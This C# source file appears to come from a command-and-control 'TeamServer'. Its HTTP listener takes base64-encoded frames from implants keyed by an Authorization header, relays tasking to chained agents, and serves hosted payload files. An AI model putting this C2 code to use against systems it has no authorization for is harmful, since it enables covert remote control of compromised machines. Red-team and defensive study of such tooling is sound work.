using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http.Extensions;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using TeamServer.Services;
using BinarySerializer;
using Shared;
using Common.APIModels;
using Common.APIModels.WebHost;
using System.Linq;
using TeamServer.Service;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        public const string AuthorizationHeader = "Authorization";

        private IAgentService _agentService;
        private IFileService _fileService;
        private IListenerService _listenerService;
        private IBinMakerService _binMakerService;
        private ILoggerFactory _loggerFactory;
        private readonly IChangeTrackingService _changeTrackingService;
        private readonly IWebHostService _webHostService;
        private readonly ICryptoService _cryptoService;
        private readonly IAuditService _auditService;
        private readonly ITaskResultService _agentTaskResultService;
        private readonly IFrameService _frameService;
        private readonly IServerService _serverService;
        private readonly IDownloadFileService _downloadFileService;
        public HttpListenerController(IAgentService agentService,
            IFileService fileService,
            IListenerService listenerService,
            IBinMakerService binMakerService,
            ILoggerFactory loggerFactory,
            IChangeTrackingService changeTrackingService,
            IWebHostService webHostService,
            ICryptoService cryptoService,
            IAuditService auditService,
            ITaskResultService agentTaskResultService,
            IFrameService frameService,
            IServerService serverService,
            IDownloadFileService downloadFileService)
        {
            this._agentService=agentService;
            this._fileService = fileService;
            this._listenerService = listenerService;
            this._binMakerService = binMakerService;
            this._loggerFactory = loggerFactory;
            this._changeTrackingService = changeTrackingService;
            this._webHostService = webHostService;
            this._cryptoService = cryptoService;
            this._auditService = auditService;
            this._agentTaskResultService = agentTaskResultService;
            this._frameService = frameService;
            this._serverService=serverService;
            this._downloadFileService = downloadFileService;
        }

        private async Task<IActionResult> WebHost(string path)
        {
            Logger.Log($"WebHost request {path}");
            //var logger = _loggerFactory.CreateLogger("WebHost");
            //logger.LogInformation($"{id}");

            var log = new WebHostLog()
            {
                Path = path,
                Date = DateTime.UtcNow,
                UserAgent = this.HttpContext.Request.Headers.ContainsKey("UserAgent") ? this.HttpContext.Request.Headers["UserAgent"].ToString() : String.Empty,
                Url = this.HttpContext.Request.GetDisplayUrl(),
            };

            try
            {
                var fileContent = _webHostService.GetFile(path);

                if (fileContent == null)
                {
                    //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
                    //Logger.Log($"NOT FOUND {path}");
                    log.StatusCode = 404;
                    this._webHostService.Addlog(log);
                    return this.NotFound();
                }

                //Logger.Log($"GET {path}");

                log.StatusCode = 200;
                this._webHostService.Addlog(log);
                return this.File(fileContent, "application/octet-stream");
            }
            catch (Exception ex)
            {
                Logger.Log($"WebHost Error : {ex}");
                return NotFound("Error");
            }
        }

        public async Task<IActionResult> HandleRequest(string relativeUrl)
        {
            if (HttpContext.Request.Method == "POST")
            {
                return await this.HandleImplant();
            }
            else
            {
                return await this.WebHost(relativeUrl);
            }
        }

        private async Task<ActionResult> HandleImplant()
        {
            try
            {
                if (!Request.Headers.ContainsKey(AuthorizationHeader))
                    return this.NotFound();

                string body;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                    body = await sr.ReadToEndAsync();

                byte[] data = Convert.FromBase64String(body);
                var frames = await data.BinaryDeserializeAsync<List<NetFrame>>();

                string agentId = Request.Headers[AuthorizationHeader];
                var agent = this._agentService.GetOrCreateAgent(agentId);

                foreach (var relayedAgent in this._agentService.GetAgentToRelay(agentId))
                {
                    this._agentService.Checkin(relayedAgent);
                    this._changeTrackingService.TrackChange(ChangingElement.Agent, relayedAgent.Id);
                }

                await this._serverService.HandleInboundFrames(frames, agentId);

                var returnedFrames = new List<NetFrame>();

                foreach (var relayedAgent in this._agentService.GetAgentToRelay(agent.Id))
                {
                    returnedFrames.AddRange(this._frameService.ExtractCachedFrame(relayedAgent.Id));
                }

                var ser = await returnedFrames.BinarySerializeAsync();
                var b64 = Convert.ToBase64String(ser);
                return Ok(b64);

            }
            catch (Exception ex)
            {
                Logger.Log($"Error While Handling Agent : {ex}");
                throw ex;
            }
        }
           
    }
}
